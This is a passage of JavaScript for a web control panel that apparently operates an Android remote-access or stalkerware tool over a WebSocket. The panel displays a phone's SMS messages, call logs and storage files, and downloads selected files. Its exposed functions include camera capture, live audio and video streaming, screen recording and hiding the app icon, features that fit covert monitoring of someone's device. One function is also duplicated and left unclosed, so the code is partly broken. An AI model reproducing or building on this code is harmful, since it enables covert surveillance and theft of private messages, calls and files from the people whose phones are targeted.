    stats=`<div class="stat-chip">Total: <span>${currentData.length}</span></div>
           <div class="stat-chip">Missed: <span>${missed}</span></div>
           <div class="stat-chip">Talk time: <span>${fmtDur(totalDur)}</span></div>`;
  }

  const PS=20, totalPages=Math.ceil(currentData.length/PS);
  const page=currentData.slice(currentPage*PS,(currentPage+1)*PS);

  let rows='';
  if(isSMS){
    rows=page.map(i=>{
      const t=String(i.type||'').toLowerCase();
      // Android SMS type: 1=inbox,2=sent,3=draft,4=outbox,5=failed,6=queued
      const raw=parseInt(i.type)||0;
      const isIn=t.includes('in')||raw===1;
      const isOut=t.includes('out')||raw===2||raw===4;
      const badge=isIn?'badge-in':isOut?'badge-out':'badge-miss';
      const label=isIn?'📥 Inbox':isOut?'📤 Sent':'📩 Other';
      const isUnread=i.read==='false'||i.read===false||i.read==='0'||i.read===0;
      const unreadPip=isUnread?'<span style="display:inline-block;width:6px;height:6px;background:#fb923c;border-radius:50%;margin-left:5px;vertical-align:middle"></span>':'';
      return `<tr style="${isIn?'background:#0a110f':isOut?'background:#0a0f1a':''}">
        <td style="vertical-align:top;width:82px"><span class="badge ${badge}">${label}</span>${unreadPip}</td>
        <td style="font-weight:500;color:#e2e8f0;white-space:nowrap;font-size:12px">${esc(i.address||i.number||'-')}</td>
        <td class="sms-msg">${esc(i.body||'—')}</td>
        <td style="color:#4b5563;font-size:11px;white-space:nowrap;vertical-align:top">${esc(i.date||'-')}</td>
      </tr>`;
    }).join('');
  } else {
    const maxDur=Math.max(...currentData.map(i=>parseInt(i.duration)||0),1);
    rows=page.map(i=>{
      const t=String(i.type||'').toLowerCase();
      const isMiss=t.includes('miss')||t==='3';
      const isOut=t.includes('out')||t==='2';
      const badge=isMiss?'badge-miss':isOut?'badge-out':'badge-in';
      const label=isMiss?'📵 Missed':isOut?'📤 Outgoing':'📞 Incoming';
      const dur=parseInt(i.duration)||0;
      const barW=Math.round(dur/maxDur*70);
      return `<tr style="${isMiss?'background:#120a0a':isOut?'background:#0a0f1a':'background:#0a110f'}">
        <td style="width:90px"><span class="badge ${badge}">${label}</span></td>
        <td style="font-weight:500;color:#e2e8f0;white-space:nowrap;font-size:12px">${esc(i.number||i.phoneNumber||'-')}</td>
        <td style="color:#94a3b8;font-size:12px">${esc(i.name||i.cachedName||'—')}</td>
        <td style="color:#4b5563;font-size:11px;white-space:nowrap">${esc(i.date||'-')}</td>
        <td><div class="duration-bar"><div class="duration-fill" style="width:${barW}px"></div><span style="font-size:11px;color:#4b5563">${fmtDur(dur)}</span></div></td>
      </tr>`;
    }).join('');
  }

  const smsHeaders='<th style="width:82px">Type</th><th>Number</th><th>Message</th><th style="width:110px">Date</th>';
  const callHeaders='<th style="width:90px">Type</th><th>Number</th><th>Name</th><th style="width:110px">Date</th><th style="width:100px">Duration</th>';

  let pager='';
  if(totalPages>1){
    pager='<div class="pagination">';
    pager+=`<span class="page-info">${currentPage*PS+1}–${Math.min((currentPage+1)*PS,currentData.length)} of ${currentData.length}</span>`;
    if(currentPage>0) pager+=`<button class="page-btn" onclick="gotoPage(${currentPage-1})">‹ Prev</button>`;
    const start=Math.max(0,currentPage-2), end=Math.min(totalPages-1,currentPage+2);
    for(let i=start;i<=end;i++) pager+=`<button class="page-btn${i===currentPage?' active':''}" onclick="gotoPage(${i})">${i+1}</button>`;
    if(currentPage<totalPages-1) pager+=`<button class="page-btn" onclick="gotoPage(${currentPage+1})">Next ›</button>`;
    pager+='</div>';
  }

  panel().innerHTML=`<div class="log-container">
    <div class="log-header">
      <h2>${icon} ${title}</h2>
      <input class="log-search" type="text" placeholder="🔍 Search…" oninput="filterRows(this.value)">
    </div>
    <div class="log-stats">${stats}</div>
    <div class="log-table-wrap">
      <table><thead><tr>${isSMS?smsHeaders:callHeaders}</tr></thead>
      <tbody id="logBody">${rows}</tbody></table>
    </div>
    ${pager}
  </div>`;
}

function filterRows(q){
  q=q.toLowerCase();
  document.querySelectorAll('#logBody tr').forEach(r=>{
    r.style.display=r.innerText.toLowerCase().includes(q)?'':'none';
  });
}
function gotoPage(p){ currentPage=p; renderTable(); }
function fmtDur(s){
  s=parseInt(s)||0;
  if(s<60) return s+'s';
  const m=Math.floor(s/60), sec=s%60;
  return m+'m '+(sec?sec+'s':'');
}

// ── File Manager — Windows Explorer Tree ───────────────────────────────────────
let currentTreePath='root';
let activeFolderPath='root';

function handleFileList(items){
  fileCache[currentTreePath]=items;

    renderFileManager();

// ── path → safe numeric ID map (avoids btoa/CSS.escape issues with unicode paths)
const _pathIdMap=new Map(); let _pathIdCtr=0;
function pathId(p){ if(!_pathIdMap.has(p)){ _pathIdMap.set(p,_pathIdCtr++); } return 'pid'+_pathIdMap.get(p); }

// ─────────────────────────────────────────────────────────────────────────────
// FILE MANAGER — unified Windows Explorer tree list
// ─────────────────────────────────────────────────────────────────────────────

function renderFileManager(){
  _pathIdMap.clear(); _pathIdCtr=0; selectedFiles.clear();
  panel().innerHTML=`<div class="fm-wrap">
    <div class="fm-toolbar">
      <button onclick="navUp()">⬆ Up</button>
      <button onclick="refreshFolder()">↺ Refresh</button>
      <button onclick="selAll()">☑ All</button>
      <button onclick="selNone()">☐ None</button>
      <div class="fm-path" id="fmPath">/storage/emulated/0</div>
      <button class="dl-btn" id="dlBtn" onclick="downloadSel()" disabled>💾 Download (0)</button>
    </div>
    <div class="fm-tree-panel" id="fmTree">
      <div class="fm-thead">
        <div class="fm-col-sel"></div>
        <div class="fm-col-name">Name</div>
        <div class="fm-col-size">Size</div>
        <div class="fm-col-date">Modified</div>
      </div>
      <div id="fmRows"><div class="fm-empty">⏳ Loading…</div></div>
    </div>
  </div>`;
  buildFMTree('root', fileCache['root']||[], document.getElementById('fmRows'), 0);
}

function buildFMTree(path, items, container, depth){
  container.innerHTML='';
  const folders=(items||[]).filter(i=>i.isDir).sort((a,b)=>a.name.localeCompare(b.name));
  const files=(items||[]).filter(i=>!i.isDir).sort((a,b)=>a.name.localeCompare(b.name));
  // files shown inline at this depth
  files.forEach(f=>container.appendChild(makeFileRow(f, depth)));
  folders.forEach(f=>{
    const id=pathId(f.path);
    const indent=depth*16;
    const row=document.createElement('div');
    row.className='tr-row tr-folder'+(f.path===activeFolderPath?' active':'');
    row.id='tn_'+id; row.title=f.path;
    row.innerHTML=
      `<div class="tr-indent" style="width:${indent}px"></div>`+
      `<div class="tr-chk"><span style="display:inline-block;width:13px"></span></div>`+
      `<div class="tr-toggle" id="tt_${id}">▶</div>`+
      `<div class="tr-ico" id="ti_${id}">📁</div>`+
      `<div class="tr-name">${esc(f.name)}</div>`+
      `<div class="tr-size">${f.childCount!=null?f.childCount+' items':'—'}</div>`+
      `<div class="tr-date">${(f.lastModified||'').substring(0,10)}</div>`;
    row.onclick=(e)=>{ e.stopPropagation(); fmClickFolder(f.path,id); };
    container.appendChild(row);
    const childDiv=document.createElement('div');
    childDiv.className='fm-children'; childDiv.id='tc_'+id;
    container.appendChild(childDiv);
    if(fileCache[f.path]) buildFMTree(f.path, fileCache[f.path], childDiv, depth+1);
  });
  if(!folders.length&&!files.length&&depth>0){
    const e=document.createElement('div');
    e.className='fm-empty'; e.style.padding='8px 32px'; e.textContent='Empty folder';
    container.appendChild(e);
  }
}

function makeFileRow(f, depth){
  const indent=depth*16;
  const d=document.createElement('div');
  d.className='tr-row tr-file'; d.dataset.path=f.path;
  d.innerHTML=
    `<div class="tr-indent" style="width:${indent}px"></div>`+
    `<div class="tr-chk"><input type="checkbox" data-path="${esc(f.path)}" onchange="toggleFileSel(this,event)"></div>`+
    `<div class="tr-toggle" style="visibility:hidden">▶</div>`+
    `<div class="tr-ico">${fileIco(f.name)}</div>`+
    `<div class="tr-name" title="${esc(f.path)}">${esc(f.name)}</div>`+
    `<div class="tr-size">${fmtBytes(f.size)}</div>`+
    `<div class="tr-date">${(f.lastModified||'').substring(0,10)}</div>`;
  return d;
}

function fmClickFolder(path, id){
  document.querySelectorAll('.tr-folder').forEach(n=>n.classList.remove('active'));
  const node=document.getElementById('tn_'+id);
  if(node) node.classList.add('active');
  activeFolderPath=path;
  const pathEl=document.getElementById('fmPath');
  if(pathEl) pathEl.innerText=path==='root'?'/storage/emulated/0':path;
  const childEl=document.getElementById('tc_'+id);
  const toggleEl=document.getElementById('tt_'+id);
  const iconEl=document.getElementById('ti_'+id);
  if(childEl){
    const willOpen=!childEl.classList.contains('open');
    childEl.classList.toggle('open',willOpen);
    if(toggleEl) toggleEl.classList.toggle('open',willOpen);
    if(iconEl) iconEl.textContent=willOpen?'📂':'📁';
    if(willOpen && childEl.childElementCount===0){
      if(fileCache[path]){ buildFMTree(path,fileCache[path],childEl,getDepth(path)+1); }
      else {
        childEl.innerHTML='<div class="fm-empty" style="padding:8px 32px">⏳ Loading…</div>';
        currentTreePath=path; sendCommand('LIST_FILES',{path});
      }
    }
  }
}

function handleFileList(items){
  fileCache[currentTreePath]=items;
  if(currentTreePath==='root'){ renderFileManager(); return; }
  const id=pathId(currentTreePath);
  const childEl=document.getElementById('tc_'+id);
  const toggleEl=document.getElementById('tt_'+id);
  const iconEl=document.getElementById('ti_'+id);
  if(childEl){
    buildFMTree(currentTreePath,items,childEl,getDepth(currentTreePath)+1);
    childEl.classList.add('open');
    if(toggleEl) toggleEl.classList.add('open');
    if(iconEl) iconEl.textContent='📂';
  } else { renderFileManager(); }
}

function getDepth(path){
  if(!path||path==='root') return 0;
  return Math.max(0, path.split('/').filter(Boolean).length-3);
}

function toggleFileSel(cb,e){
  if(e) e.stopPropagation();
  const p=cb.dataset.path, row=cb.closest('.tr-file');
  if(cb.checked){ selectedFiles.add(p); row&&row.classList.add('sel'); }
  else{ selectedFiles.delete(p); row&&row.classList.remove('sel'); }
  updateDlBtn();
}
function selAll(){
  document.querySelectorAll('.tr-file input[type=checkbox]').forEach(cb=>{
    cb.checked=true; selectedFiles.add(cb.dataset.path);
    const r=cb.closest('.tr-file'); if(r) r.classList.add('sel');
  }); updateDlBtn();
}
function selNone(){
  document.querySelectorAll('.tr-file input[type=checkbox]').forEach(cb=>{
    cb.checked=false; const r=cb.closest('.tr-file'); if(r) r.classList.remove('sel');
  }); selectedFiles.clear(); updateDlBtn();
}
function updateDlBtn(){
  const b=document.getElementById('dlBtn'); if(!b) return;
  const n=selectedFiles.size; b.innerText='💾 Download ('+n+')'; b.disabled=n===0;
}
function downloadSel(){
  if(!selectedFiles.size){ notify('Select files first'); return; }
  notify('⬇ Sending '+selectedFiles.size+' request(s)…');
  selectedFiles.forEach(p=>{ if(ws&&ws.readyState===1) ws.send('dl '+p); });
}
function navUp(){
  if(!activeFolderPath||activeFolderPath==='root') return;
  const parts=activeFolderPath.split('/'); parts.pop();
  const parent=parts.length<=3?'root':parts.join('/');
  activeFolderPath=parent;
  const pathEl=document.getElementById('fmPath');
  if(pathEl) pathEl.innerText=parent==='root'?'/storage/emulated/0':parent;
  const pid=pathId(parent);
  document.querySelectorAll('.tr-folder').forEach(n=>n.classList.remove('active'));
  const pnode=document.getElementById('tn_'+pid); if(pnode) pnode.classList.add('active');
}
function refreshFolder(){
  if(!activeFolderPath) return;
  delete fileCache[activeFolderPath]; currentTreePath=activeFolderPath;
  const id=pathId(activeFolderPath);
  const c=document.getElementById('tc_'+id);
  if(c) c.innerHTML='<div class="fm-empty" style="padding:8px 32px">⏳ Refreshing…</div>';
  sendCommand('LIST_FILES',{path:activeFolderPath});
}
function fileIco(n){
  const e=(n||'').split('.').pop().toLowerCase();
  if(['jpg','jpeg','png','gif','webp','bmp','heic'].includes(e)) return '🖼';
  if(['mp4','mkv','avi','mov','webm','3gp'].includes(e)) return '🎬';
  if(['mp3','aac','wav','m4a','ogg','flac','amr'].includes(e)) return '🎵';
  if(e==='pdf') return '📕';
  if(['zip','rar','7z','tar','gz'].includes(e)) return '🗜';
  if(e==='apk') return '📦';
  if(['txt','log','md','csv'].includes(e)) return '📝';
  if(['doc','docx','xls','xlsx','ppt','pptx'].includes(e)) return '📊';
  return '📄';
}
function fmtBytes(b){
  if(!b||b<=0) return '—';
  const k=1024, sz=['B','KB','MB','GB'];
  const i=Math.min(Math.floor(Math.log(b)/Math.log(k)),sz.length-1);
  return parseFloat((b/Math.pow(k,i)).toFixed(1))+' '+sz[i];
}

// ── Expose globals ─────────────────────────────────────────────────────────────
window.toggleScreen=toggleScreen; window.toggleCameraPanel=toggleCameraPanel;
window.capturePicture=capturePicture; window.startLiveStream=startLiveStream;
window.stopLiveStream=stopLiveStream; window.toggleLiveAudio=toggleLiveAudio;
window.stopLiveAudio=stopLiveAudio; window.sendCommand=sendCommand;
window.sendPlain=sendPlain; window.loadSMS=loadSMS; window.openFileManager=openFileManager;
window.toggleAppIcon=toggleAppIcon; window.takeSnapshot=takeSnapshot;
window.toggleCamRec=toggleCamRec; window.toggleScreenRec=toggleScreenRec;
window.changeScreenQ=changeScreenQ; window.dlBase64=dlBase64;
window.gotoPage=gotoPage; window.filterRows=filterRows;
window.treeClickFolder=fmClickFolder; window.fmClickFolder=fmClickFolder;
window.toggleFileSel=toggleFileSel; window.selAll=selAll; window.selNone=selNone;
window.downloadSel=downloadSel; window.navUp=navUp; window.refreshFolder=refreshFolder;
window.snapScreen=snapScreen; window.connectWebSocket=connectWebSocket;

document.getElementById('screenShareBtn').addEventListener('click',toggleScreen);
connectWebSocket();
</script>
